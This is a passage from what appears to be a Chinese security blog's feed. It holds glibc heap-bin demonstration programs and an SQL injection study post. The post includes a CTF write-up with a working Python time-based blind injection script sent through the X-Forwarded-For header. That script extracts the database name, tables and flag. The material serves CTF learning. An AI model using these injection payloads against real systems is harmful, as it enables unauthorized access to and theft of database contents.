class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">0x120</span>;</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *junk = <span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//放置释放p和q之后，p和q发生合并</span></span><br><span class="line">    <span class="keyword">void</span> *q = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *r = <span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//放置释放q之后，q和topchunk发生合并</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p:0x%x\n"</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"q:0x%x\n"</span>,q);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"r:0x%x\n"</span>,r);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(p,<span class="string">"aaaaaaaabbbbbbbb"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(q,<span class="string">"ccccccccdddddddd"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(r,<span class="string">"eeeeeeeeffffffff"</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151435089.png" alt="image-20201216151435089"></p><p>释放p和q</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151556927.png" alt="image-20201216151556927"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151633713.png" alt="image-20201216151633713"></p><p>分配0x90  </p><ul><li>首先两个unsortedbin chunk中可以分割到0x90那么就会consolidate 将其全部放入smallbins中</li><li>之后分割其中一部分 并将剩余的放入lastremainder</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216151705158.png" alt="image-20201216151705158"></p></blockquote><h4 id="5-演示二-1"><a href="#5-演示二-1" class="headerlink" title="5.演示二"></a>5.演示二</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x200</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p2和p3都被释放之后，p2和p3发生合并</span></span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p3被释放之后与topchunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看释放p1 p2 p3</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216155717972.png" alt="image-20201216155717972"></p><p>这里继续想一下下一步会发生什么？</p><ul><li>分配大小0x100可以分配 那么就直接触发consolidate说明smallbin中就会有free chunk</li><li>lastremainder会放入unsortedbin中，此外fastfreechunk不会合并</li><li>那么我们就得到了</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216160152597.png" alt="image-20201216160152597"></p></blockquote><h4 id="6-演示三"><a href="#6-演示三" class="headerlink" title="6.演示三"></a>6.演示三</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//防止p1被释放之后与topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看p1释放后</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160410739.png" alt="image-20201216160410739"></p><p>之后会分配0x700说明要分配较大的chunk 此时会被整理到smallbins中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160827250.png" alt="image-20201216160827250"></p><p>继续分配0x200 lastremainder会进入unsortedbin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160910272.png" alt="image-20201216160910272"></p></blockquote><h4 id="7-演示四"><a href="#7-演示四" class="headerlink" title="7.演示四"></a>7.演示四</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//防止p1释放并consolidate到smallbins中之后，再释放p2导致p1和p2合并，合并之后又被放入unsortedbin中</span></span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>); </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);<span class="comment">//防止p2被释放之后与topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>先看堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164710877.png" alt="image-20201216164710877"></p><p>释放p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164747866.png" alt="image-20201216164747866"></p><p>分配0x700 由于unsorted bin中的chunk不够 所以直接从top chunk中分割</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164913709.png" alt="image-20201216164913709"></p><p>free tmp和p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165109899.png" alt="image-20201216165109899"></p><p>重点来看最后一步 这里，malloc(0x200)，此时malloc会切割smallbins中的p1，并产生last remainder（0x602250），并把last remainder放入到unsortedbin中。由于切割chunk并产生last remainder会发生consolidate，所以unsortedbin中的p2从unsortedbin中整理到smallbins中（由于此种情况的consolidate不会整理fastbins中的chunk，所以fastbins中的chunk仍然在fastbins中）</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165224983.png" alt="image-20201216165224983"></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆-持续更新&quot;&gt;&lt;a href=&quot;#堆-持续更新&quot; class=&quot;headerlink&quot; title=&quot;堆(持续更新)&quot;&gt;&lt;/a&gt;堆(持续更新)&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/07/23/Heap/&quot; target=</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-12-09T15:38:24.000Z</published>
    <updated>2020-12-09T15:39:32.233Z</updated>
    
    <content type="html"><![CDATA[<p>我就单纯想把这些东西存下来</p><h1 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h1><h2 id="1-SQL注入的分类"><a href="#1-SQL注入的分类" class="headerlink" title="1.SQL注入的分类"></a>1.SQL注入的分类</h2><ul><li><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ul><li><h4 id="基于错误的SQL注入"><a href="#基于错误的SQL注入" class="headerlink" title="基于错误的SQL注入"></a>基于错误的SQL注入</h4></li><li><h4 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h4></li><li><h4 id="堆查询注射"><a href="#堆查询注射" class="headerlink" title="堆查询注射"></a>堆查询注射</h4></li><li><h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><ul><li><h5 id="基于布尔SQL盲注"><a href="#基于布尔SQL盲注" class="headerlink" title="基于布尔SQL盲注"></a>基于布尔SQL盲注</h5></li><li><h5 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h5></li><li><h5 id="基于报错的SQL盲注"><a href="#基于报错的SQL盲注" class="headerlink" title="基于报错的SQL盲注"></a>基于报错的SQL盲注</h5></li></ul></li></ul></li></ul><ul><li><h3 id="基于如何处理输入的SQL查询"><a href="#基于如何处理输入的SQL查询" class="headerlink" title="基于如何处理输入的SQL查询"></a>基于如何处理输入的SQL查询</h3><ul><li><h5 id="基于字符串"><a href="#基于字符串" class="headerlink" title="基于字符串"></a>基于字符串</h5></li><li><h5 id="数字或整数"><a href="#数字或整数" class="headerlink" title="数字或整数"></a>数字或整数</h5></li></ul></li><li><h3 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h3><ul><li><h5 id="一阶注射"><a href="#一阶注射" class="headerlink" title="一阶注射"></a>一阶注射</h5></li><li><h5 id="二阶注射"><a href="#二阶注射" class="headerlink" title="二阶注射"></a>二阶注射</h5></li></ul></li><li><h3 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h3><ul><li><h5 id="通过用户输入的表单域的注射"><a href="#通过用户输入的表单域的注射" class="headerlink" title="通过用户输入的表单域的注射"></a>通过用户输入的表单域的注射</h5></li><li><h5 id="通过cookie注射"><a href="#通过cookie注射" class="headerlink" title="通过cookie注射"></a>通过cookie注射</h5></li><li><h5 id="通过服务器变量"><a href="#通过服务器变量" class="headerlink" title="通过服务器变量"></a>通过服务器变量</h5></li></ul></li></ul><h2 id="2-基础函数与逻辑"><a href="#2-基础函数与逻辑" class="headerlink" title="2.基础函数与逻辑"></a>2.基础函数与逻辑</h2><h3 id="1-基础函数"><a href="#1-基础函数" class="headerlink" title="1.基础函数"></a>1.基础函数</h3><p>​    concat(str1,str2)   ——无分隔连接字符串</p><p>​    concat_ws(separator,str1,str2)   ——含有分隔符连接字符串</p><p>​    group_concat(str1,str2)  ——以逗号分隔每一条数据，连接一个组的字符串</p><h3 id="2-基础逻辑"><a href="#2-基础逻辑" class="headerlink" title="2.基础逻辑"></a>2.基础逻辑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"select * from users where id='$id' limit 0,1"</span>;</span><br></pre></td></tr></table></figure><p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用—+ 或者 #（%23）。</p><p>limit 从0开始，至少1个数据</p><p>limit 10  至少10个数据</p><h3 id="3-union操作符的用法"><a href="#3-union操作符的用法" class="headerlink" title="3.union操作符的用法"></a>3.union操作符的用法</h3><p>union操作符用于合并两个或多个select语句的结果集。但注意的是，select的语句必须有相同数量的列，列也有相同的类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_names <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> column_names <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure><h3 id="4-一般操作"><a href="#4-一般操作" class="headerlink" title="4.一般操作"></a>4.一般操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema; //进入系统数据库</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'myclass'</span>; //搜索当数据库名为myclass中各表的名字</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png" alt="image-20200502160256194"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //猜数据库</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span>; //猜某库的数据表</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">form</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'表名'</span>; //猜某表的数据段</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> *; //猜数据段的内容</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png" alt="image-20200502161927164_WPS图片"></p><h2 id="3-盲注的讲解（先看1-4之后再来看）"><a href="#3-盲注的讲解（先看1-4之后再来看）" class="headerlink" title="3.盲注的讲解（先看1-4之后再来看）"></a>3.盲注的讲解（先看1-4之后再来看）</h2><h3 id="1-基于布尔的SQL盲注"><a href="#1-基于布尔的SQL盲注" class="headerlink" title="1.基于布尔的SQL盲注"></a>1.基于布尔的SQL盲注</h3><h3 id="2-基于时间的SQL盲注"><a href="#2-基于时间的SQL盲注" class="headerlink" title="2.基于时间的SQL盲注"></a>2.基于时间的SQL盲注</h3><p>时间盲注和布尔盲注非常类似，但时间盲注是利用sleep()​和benchmark()等函数让mysql执行的时间变长。</p><p>时间盲注多与IF(expr1,expr2,expr3)结合使用，如果expr1是true，则执行expr2，否则执行expr3</p><h3 id="INSERT-INTO注入-case延时盲注"><a href="#INSERT-INTO注入-case延时盲注" class="headerlink" title="INSERT INTO注入(case延时盲注)"></a>INSERT INTO注入(case延时盲注)</h3><p>看了源码知道取xff头,并且explode过滤逗号。题目的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;获取请求的ip地址</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;将逗号过滤</span><br><span class="line">return $ip_arr[0]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>这道题是<strong>盲注</strong>题目说得也很明白，问题是怎么注入呢？这里有两个问题</p><ul><li>第一个是理解<code>insert...into</code>注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class="line">&#x2F;&#x2F;这里主要结合sleep()进行注入</span><br><span class="line">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class="line">&#x2F;&#x2F;这样就插入了一条id&#x3D;1,name&#x3D;null的数据</span><br></pre></td></tr></table></figure><ul><li>第二个是过滤逗号的，<strong>所以不能用<code>if(a,b,c)</code>应该用<code>case...when...then</code>同时常用的截取字符串函数<code>substr([str],[start],[len])</code>也有替代的<code>substr([str]from [strat] for [len])</code></strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case...when...then</span><br><span class="line">简单case函数</span><br><span class="line">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">when &#39;2&#39; then &#39;nv&#39;</span><br><span class="line">else &#39;qita&#39; end</span><br><span class="line">case搜索函数</span><br><span class="line">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class="line"> when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class="line"> else &#39;qita&#39; end</span><br></pre></td></tr></table></figure><p>接下来只需要构造就可以了、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class="line">&#x2F;&#x2F;最后一个)用来闭合 #用来注释</span><br></pre></td></tr></table></figure><p>接下来就可以写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url = url,headers = headers,timeout = <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag is :&#123;"</span> +flag+<span class="string">"&#125;"</span>)</span><br><span class="line">//数据库</span><br><span class="line">payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">库为web15</span><br><span class="line">//表</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">表为client_ip,flag</span><br><span class="line">//列</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">flag</span><br><span class="line">//flag</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br></pre></td></tr></table></figure><p>就可以得到flag了。</p><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h3 id="多次（mid布尔盲注）"><a href="#多次（mid布尔盲注）" class="headerlink" title="多次（mid布尔盲注）"></a>多次（mid布尔盲注）</h3><p>主要学习一下<strong>异或注入</strong>判断过滤了哪些关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">异或：1^1&#x3D;0，1^0&#x3D;1，0^1&#x3D;1，0^0&#x3D;0</span><br><span class="line">这样当构造：?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class="line">若返回正确页面的回显(There is nothing.)，则说明(length(&#39;and&#39;)&#x3D;0)为假;</span><br><span class="line">若返回错误页面的回显(Error,Error,Error!)，则说明(length(&#39;and&#39;)&#x3D;0)为真。</span><br><span class="line"></span><br><span class="line">这里?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+均回显了Error,Error,Error!，说明(length(&#39;and&#39;)&#x3D;0)为真，那么可判断and被过滤了</span><br><span class="line">同理可判断or、select、union也被过滤了</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>注意的是：information中也有or</p><p>继续学习盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import 